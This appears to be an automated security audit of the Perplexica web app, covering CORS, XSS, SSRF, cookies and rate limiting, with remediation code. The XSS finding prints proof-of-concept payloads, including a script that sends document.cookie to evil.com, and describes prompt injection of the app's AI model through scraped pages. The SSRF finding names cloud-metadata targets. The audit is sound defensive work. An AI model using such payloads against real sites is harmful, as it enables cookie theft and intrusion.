# Gate 3 Security Audit -- Perplexica Web App

**Auditor**: Claude Opus 4.6 (automated)
**Date**: 2026-03-31
**Scope**: Full-stack -- RedwoodJS frontend + Phoenix/Elixir backend
**Severity scale**: CRITICAL / HIGH / MEDIUM / LOW

---

## Executive Summary

The Perplexica codebase has **2 CRITICAL**, **3 HIGH**, **3 MEDIUM**, and **4 LOW** findings. The two critical issues are (1) a stored XSS vector via unsanitized markdown rendering piped into `dangerouslySetInnerHTML`, and (2) a fully open CORS policy (`["*"]`) on every API route. Both are exploitable in production today and should be resolved before any public release.

---

## Checklist Scorecard

| # | Area | Verdict | Severity |
|---|------|---------|----------|
| 1 | CSP Headers | **FAIL** | HIGH |
| 2 | CORS | **FAIL** | CRITICAL |
| 3 | XSS | **FAIL** | CRITICAL |
| 4 | CSRF | **PARTIAL** | MEDIUM |
| 5 | Cookie Security | **PARTIAL** | MEDIUM |
| 6 | Input Validation | **PARTIAL** | MEDIUM |
| 7 | Rate Limiting | **FAIL** | HIGH |
| 8 | Dependency Audit | **PARTIAL** | LOW |
| 9 | HTTPS / HSTS | **PASS** | -- |
| 10 | SSRF | **FAIL** | HIGH |
| 11 | Secret Management | **PARTIAL** | LOW |
| 12 | Session Security | **PARTIAL** | LOW |

---

## Detailed Findings

### 1. CSP Headers -- FAIL (HIGH)

**Location**: `phoenix/lib/perplexica_web/endpoint.ex`, `phoenix/lib/perplexica_web/router.ex`

No `Content-Security-Policy` header is set anywhere in the pipeline. Without CSP, any successful XSS injection has full access to the DOM, cookies, and outbound requests.

**Evidence**: Searched all Phoenix config, endpoint, and router files for `content.security.policy`, `CSP`, `x-frame-options`, `x-content-type`. Zero matches.

**Recommendation**:
Add a `Plug` that sets security headers in `endpoint.ex`:

```elixir
plug :put_secure_browser_headers, %{
  "content-security-policy" => "default-src 'self'; script-src 'self'; style-src 'self' 'unsafe-inline'; img-src 'self' https:; connect-src 'self' https://api.search.brave.com",
  "x-content-type-options" => "nosniff",
  "x-frame-options" => "DENY"
}
```

---

### 2. CORS -- FAIL (CRITICAL)

**Location**: `phoenix/lib/perplexica_web/router.ex:6`

```elixir
plug CORSPlug, origin: ["*"]
```

Every API route (including all GraphQL mutations -- `startSearch`, `deleteChat`, `createShareLink`, `toggleBookmark`) accepts requests from **any origin**. An attacker can craft a malicious page that issues mutations against a victim's Perplexica instance from a completely unrelated domain.

**Impact**: Any website can read data from and write data to the Perplexica API on behalf of a visiting user. Combined with the lack of authentication, this means any site on the internet can delete all chats, create share links, and execute arbitrary searches.

**Recommendation**:
Restrict to known origins:

```elixir
plug CORSPlug, origin: [
  System.get_env("FRONTEND_URL", "http://localhost:8910")
]
```

---

### 3. XSS via `dangerouslySetInnerHTML` + Unsanitized Markdown -- FAIL (CRITICAL)

**Locations**:
- `redwood/web/src/lib/renderMarkdown.ts` (lines 133-205)
- `redwood/web/src/components/Chat/MessageBox.tsx:127`
- `redwood/web/src/pages/SharedPage/SharedPage.tsx:134`
- `redwood/web/src/pages/LibraryPage/LibraryPage.tsx:133`

The `renderMarkdown()` function is a hand-rolled regex-based markdown-to-HTML converter. It performs **no sanitization**. Its output is injected verbatim into the DOM via React's `dangerouslySetInnerHTML`.

**Attack vector**: The answer text originates from AI model responses, which themselves summarize web-scraped content. If a scraped page contains a payload like:

```
<img src=x onerror=alert(document.cookie)>
```

...or if the AI model is manipulated via prompt injection to emit HTML/JS, the payload flows through `renderMarkdown()` unmodified (the regex replacements don't strip arbitrary HTML tags) and is rendered as live DOM.

**Proof of concept** -- the following markdown, if it appears in an answer:

```markdown
Hello <script>fetch('https://evil.com/steal?c='+document.cookie)</script> world
```

The `renderMarkdown` function will not strip the `<script>` tag. The paragraph regex will wrap surrounding text but the script tag passes through intact. When inserted via `dangerouslySetInnerHTML`, it executes.

Similarly, event-handler-based payloads survive:

```markdown
<img src=x onerror="alert(1)">
```

**Note**: DOMPurify (`dompurify@3.3.3`) is present in `yarn.lock` as a transitive dependency, but it is **never imported or used** anywhere in the application source code (`redwood/web/src/`).

**Recommendation**:
1. Install DOMPurify as a direct dependency: `yarn add dompurify`
2. Sanitize in `renderMarkdown.ts`:

```typescript
import DOMPurify from 'dompurify'

export function renderMarkdown(text: string): string {
  if (!text) return ''
  const raw = /* ...existing regex pipeline... */
  return DOMPurify.sanitize(raw, {
    ALLOWED_TAGS: ['h1','h2','h3','p','a','strong','em','code','pre',
                   'ul','ol','li','blockquote','table','tbody','tr','td','th','sup','br','hr'],
    ALLOWED_ATTR: ['href','target','rel','class','id','data-topic','style'],
  })
}
```

---

### 4. CSRF Protection -- PARTIAL (MEDIUM)

**Location**: `phoenix/lib/perplexica_web/router.ex`, `phoenix/lib/perplexica_web/endpoint.ex`

The API pipeline uses only `:accepts, ["json"]` and `CORSPlug`. There is no CSRF token verification on mutations. Phoenix's built-in `protect_from_forgery` plug is not applied.

For a JSON-only GraphQL API with proper CORS, CSRF is mitigated because:
- Browsers cannot send `Content-Type: application/json` cross-origin without a preflight.
- However, the CORS policy is currently `["*"]`, which **completely negates this protection**.

**Impact**: With the current `origin: ["*"]` CORS, CSRF is fully exploitable. Even after CORS is fixed, the lack of explicit CSRF tokens means any misconfiguration re-opens the attack surface.

**Recommendation**:
1. Fix CORS first (Finding #2).
2. Consider adding a custom header check (e.g., `X-Requested-With: GraphQL`) that the frontend always sends and the backend requires. This is a defense-in-depth measure.

---

### 5. Cookie Security -- PARTIAL (MEDIUM)

**Location**: `phoenix/lib/perplexica_web/endpoint.ex:7-12`

```elixir
@session_options [
  store: :cookie,
  key: "_perplexica_key",
  signing_salt: "teJ5EcuW",
  same_site: "Lax"
]
```

**Issues**:
- **`secure: true` is missing**: Session cookie will be sent over plain HTTP. In production behind force_ssl this is partially mitigated, but the cookie itself should be marked `Secure`.
- **`http_only` is not explicitly set**: Phoenix defaults `http_only` to `true` in `Plug.Session`, so this is implicitly safe, but should be explicit for auditability.
- **`encryption_salt` is not set**: The session cookie is signed but **not encrypted**. Its contents (if any sensitive data is stored) can be read by the client.

**Recommendation**:

```elixir
@session_options [
  store: :cookie,
  key: "_perplexica_key",
  signing_salt: "teJ5EcuW",
  encryption_salt: "generate_a_strong_salt_here",
  same_site: "Lax",
  secure: true,
  http_only: true,
  max_age: 86_400 * 30  # 30 days
]
```

---

### 6. Input Validation -- PARTIAL (MEDIUM)

**Locations**:
- `phoenix/lib/perplexica_web/schema.ex` (GraphQL schema)
- `phoenix/lib/perplexica_web/resolvers/search_resolver.ex`
- `phoenix/lib/perplexica/search/actions/scrape_url.ex`

**Issues**:

**6a. No query length limit**: The `startSearch` mutation accepts a `query: non_null(:string)` with no maximum length. An attacker can send a multi-megabyte query string, which will be forwarded to the AI model API and stored in PostgreSQL.

**6b. No GraphQL depth/complexity limits**: The Absinthe schema has no `max_complexity` or `max_depth` configuration. While the current schema is relatively flat, this is a missing defense-in-depth measure.

**6c. No pagination on list queries**: `chats`, `messages`, and `bookmarks` queries return all records with no limit. A user with thousands of chats would trigger unbounded data transfer.

**6d. `system_instructions` passed unsanitized**: The `startSearch` mutation accepts a `system_instructions: :string` argument that is passed directly to the AI model. This is a prompt injection surface.

**Recommendation**:
- Add `validate_length(:query, max: 10_000)` in the Message changeset.
- Add Absinthe complexity analysis:
  ```elixir
  # In schema.ex
  def middleware(middleware, _field, _object) do
    middleware ++ [Absinthe.Middleware.Complexity]
  end
  ```
- Add `first`/`limit` arguments to list queries (default 50, max 200).
- Sanitize or remove the `system_instructions` argument, or constrain it to a known set of values.

---

### 7. Rate Limiting on GraphQL Endpoint -- FAIL (HIGH)

**Location**: `phoenix/lib/perplexica_web/router.ex`

Rate limiting exists only for **outbound** Brave Search API calls (`phoenix/lib/perplexica/search_sources/brave.ex:167`). There is **no rate limiting on the GraphQL endpoint itself**.

An attacker can:
- Flood `startSearch` mutations, exhausting AI API credits.
- Spam `createShareLink` to create millions of share links.
- Call `deleteChat` in a loop to wipe all data.
- Poll `messages` query thousands of times per second.

**Recommendation**:
Add a rate-limiting plug to the API pipeline:

```elixir
# Using Hammer (already a dependency)
pipeline :api do
  plug :accepts, ["json"]
  plug :rate_limit_api
  plug CORSPlug, origin: [...]
end

defp rate_limit_api(conn, _opts) do
  ip = conn.remote_ip |> :inet.ntoa() |> to_string()
  case Hammer.check_rate("api:#{ip}", 60_000, 100) do
    {:allow, _} -> conn
    {:deny, _} ->
      conn
      |> put_resp_content_type("application/json")
      |> send_resp(429, Jason.encode!(%{error: "Rate limit exceeded"}))
      |> halt()
  end
end
```

---

### 8. Dependency Audit -- PARTIAL (LOW)

**Observation**: The project uses standard, well-maintained dependencies:
- Phoenix 1.8.5, Absinthe 1.7, Ecto 3.13 (Elixir side)
- React 18.3.1, RedwoodJS 8.9.0 (frontend side)
- No obviously vulnerable or abandoned packages observed in `package.json` or `mix.exs`.

**Note**: Could not run `npm audit` or `mix audit` in this audit. Recommend running both in CI:
```bash
cd redwood && yarn audit
cd phoenix && mix deps.audit  # requires mix_audit
```

---

### 9. HTTPS / HSTS -- PASS

**Location**: `phoenix/config/prod.exs:6-13`

```elixir
config :perplexica, PerplexicaWeb.Endpoint,
  force_ssl: [
    rewrite_on: [:x_forwarded_proto],
    exclude: [paths: ["/health"], hosts: ["localhost", "127.0.0.1"]]
  ]
```

Production correctly forces SSL via `force_ssl`, which also sets the HSTS header. The `/health` endpoint is appropriately excluded for load balancer probes. The `rewrite_on: [:x_forwarded_proto]` correctly handles reverse proxy (Fly.io/Railway) setups.

**No issues found.**

---

### 10. SSRF via `scrape_url` -- FAIL (HIGH)

**Locations**:
- `phoenix/lib/perplexica/search/actions/scrape_url.ex:28-47`
- `phoenix/lib/perplexica/search_sources/brave.ex:108-122`

The `scrape_url` action accepts an array of URLs from the AI model's tool calls and fetches them with `HTTPoison.get`. There is **zero URL validation**:

```elixir
def scrape_url(url, opts \\ []) do
  timeout = Keyword.get(opts, :timeout, 10_000)
  case HTTPoison.get(url, ..., follow_redirect: true, max_redirect: 3) do
```

**Attack vectors**:
- **Internal network scanning**: `http://169.254.169.254/latest/meta-data/` (AWS metadata), `http://localhost:5432/` (PostgreSQL), or any internal service.
- **Cloud metadata theft**: On AWS/GCP/Azure, the instance metadata endpoint exposes IAM credentials, secrets, and instance identity.
- **Port scanning**: An attacker can use crafted queries to make the AI model call `scrape_url` against arbitrary internal IPs/ports.
- **File read** (if HTTPoison follows `file://`): Potential local file disclosure.

The `follow_redirect: true` with `max_redirect: 3` means even if the initial URL looks safe, a redirect chain can lead to internal resources.

**Recommendation**:

```elixir
defp validate_url(url) do
  uri = URI.parse(url)
  cond do
    uri.scheme not in ["http", "https"] -> {:error, :invalid_scheme}
    uri.host in ["localhost", "127.0.0.1", "0.0.0.0", "::1"] -> {:error, :localhost}
    String.ends_with?(uri.host || "", ".internal") -> {:error, :internal}
    ip_private?(uri.host) -> {:error, :private_ip}
    true -> :ok
  end
end

defp ip_private?(host) do
  case :inet.parse_address(to_charlist(host || "")) do
    {:ok, {10, _, _, _}} -> true
    {:ok, {172, b, _, _}} when b >= 16 and b <= 31 -> true
    {:ok, {192, 168, _, _}} -> true
    {:ok, {169, 254, _, _}} -> true  # link-local / cloud metadata
    _ -> false
  end
end
```

---

### 11. Secret Management -- PARTIAL (LOW)

**Locations**:
- `phoenix/config/runtime.exs:49-54` -- Production `SECRET_KEY_BASE` loaded from env var (correct).
- `phoenix/config/dev.exs:26` -- Dev `secret_key_base` hardcoded (acceptable for dev).
- `phoenix/config/test.exs:20` -- Test `secret_key_base` hardcoded (acceptable for test).
- `redwood/web/src/index.html:14` -- **Hardcoded Cloudflare Tunnel URL**.

**Issues**:

**11a. Hardcoded Cloudflare tunnel URL in index.html**:
```html
window.__PHOENIX_URL__ = 'https://organizations-commit-fiber-huntington.trycloudflare.com';
```

This leaks an internal development/staging tunnel URL to anyone who views the page source. While Cloudflare tunnels are ephemeral, this pattern is fragile and exposes internal infrastructure.

**11b. Signing salt hardcoded in source**:
The session `signing_salt: "teJ5EcuW"` and LiveView `signing_salt: "piHtsvlE"` are hardcoded in checked-in config files. While these are less sensitive than `secret_key_base` (they're combined with it), best practice is to use env vars.

**Recommendation**:
- Move the `__PHOENIX_URL__` to an environment variable injected at build time.
- Move signing salts to env vars for production.

---

### 12. Session Security -- PARTIAL (LOW)

**Location**: `phoenix/lib/perplexica_web/endpoint.ex:7-12`

**Issues**:

**12a. Short signing salt**: `"teJ5EcuW"` (8 characters). While the salt is combined with the 64+ byte `secret_key_base`, a longer salt provides additional entropy.

**12b. No `max_age` set**: The session cookie has no explicit expiry. Phoenix defaults to a browser session (deleted when browser closes), which is reasonable, but an explicit `max_age` provides more control.

**12c. No session fixation protection**: There is no mechanism to regenerate the session ID after authentication state changes. Currently the app has no auth, so this is theoretical, but should be addressed when auth is added.

**Note**: Session cookies are currently not used for anything meaningful (no auth), so practical risk is LOW.

---

## Additional Findings

### A1. No Authentication / Authorization (HIGH, out of scope but noted)

No authentication or authorization exists on any endpoint. Every GraphQL query and mutation is accessible to any anonymous user. The `_context` argument in all resolvers is never inspected for user identity.

This means:
- Anyone can read all chats from all users.
- Anyone can delete any chat.
- Anyone can create share links for any message.
- There is no concept of "my chats" vs "your chats".

The database schema includes a `users` table (`priv/repo/migrations/...create_core_tables.exs:105`), but it is not wired to the API.

### A2. Hardcoded Cloudflare Tunnel URL (LOW)

**Location**: `redwood/web/src/index.html:14`

```javascript
window.__PHOENIX_URL__ = 'https://organizations-commit-fiber-huntington.trycloudflare.com';
```

This is a development convenience that should never ship to production. It means any non-localhost deployment will route API calls to a specific (possibly expired) Cloudflare tunnel rather than the actual backend.

### A3. GraphiQL Exposed in Dev Only (INFO)

**Location**: `phoenix/lib/perplexica_web/router.ex:16-19`

The GraphiQL playground is correctly gated behind `Mix.env() == :dev`. No issue for production.

### A4. `String.to_existing_atom` Usage (INFO)

**Location**: `phoenix/lib/perplexica_web/resolvers/share_resolver.ex:142`

```elixir
opts |> Keyword.get(String.to_existing_atom(key), key) |> to_string()
```

This uses `to_existing_atom` (not `to_atom`), which is safe -- it will not create new atoms and cannot cause atom table exhaustion. No issue.

### A5. Database SSL Disabled (LOW)

**Location**: `phoenix/config/runtime.exs:37`

```elixir
# ssl: true,
```

Database SSL is commented out. In production, the connection between the app and PostgreSQL should be encrypted, especially if the database is on a different host.

---

## Remediation Priority

| Priority | Finding | Effort |
|----------|---------|--------|
| **P0 -- Fix immediately** | #3 XSS (add DOMPurify) | 1 hour |
| **P0 -- Fix immediately** | #2 CORS wildcard | 15 min |
| **P1 -- Fix before release** | #10 SSRF URL validation | 2 hours |
| **P1 -- Fix before release** | #7 API rate limiting | 2 hours |
| **P1 -- Fix before release** | #1 CSP headers | 1 hour |
| **P2 -- Fix soon** | #4 CSRF defense-in-depth | 1 hour |
| **P2 -- Fix soon** | #5 Cookie hardening | 30 min |
| **P2 -- Fix soon** | #6 Input validation / query limits | 2 hours |
| **P3 -- Backlog** | #11 Secret management cleanup | 1 hour |
| **P3 -- Backlog** | #12 Session hardening | 30 min |
| **P3 -- Backlog** | A1 Authentication (architectural) | Multi-day |
| **P3 -- Backlog** | A5 Database SSL | 15 min |

---

## Files Audited

### Frontend (redwood/web/src/)
- `lib/phoenix.ts`
- `lib/renderMarkdown.ts`
- `lib/useSearch.ts`
- `components/Chat/MessageBox.tsx`
- `components/Chat/AnswerActionBar.tsx`
- `pages/SharedPage/SharedPage.tsx`
- `pages/LibraryPage/LibraryPage.tsx`
- `index.html`

### Backend (phoenix/)
- `lib/perplexica_web/router.ex`
- `lib/perplexica_web/endpoint.ex`
- `lib/perplexica_web/schema.ex`
- `lib/perplexica_web/schema/chat_types.ex`
- `lib/perplexica_web/resolvers/chat_resolver.ex`
- `lib/perplexica_web/resolvers/search_resolver.ex`
- `lib/perplexica_web/resolvers/share_resolver.ex`
- `lib/perplexica_web/resolvers/provider_resolver.ex`
- `lib/perplexica/search/actions/scrape_url.ex`
- `lib/perplexica/search_sources/brave.ex`
- `lib/perplexica/chat.ex`
- `lib/perplexica/message.ex`
- `lib/perplexica/shared_link.ex`
- `lib/perplexica/bookmark.ex`
- `config/prod.exs`
- `config/dev.exs`
- `config/config.exs`
- `config/runtime.exs`
- `mix.exs`

### Package Manifests
- `redwood/web/package.json`
- `phoenix/mix.exs`
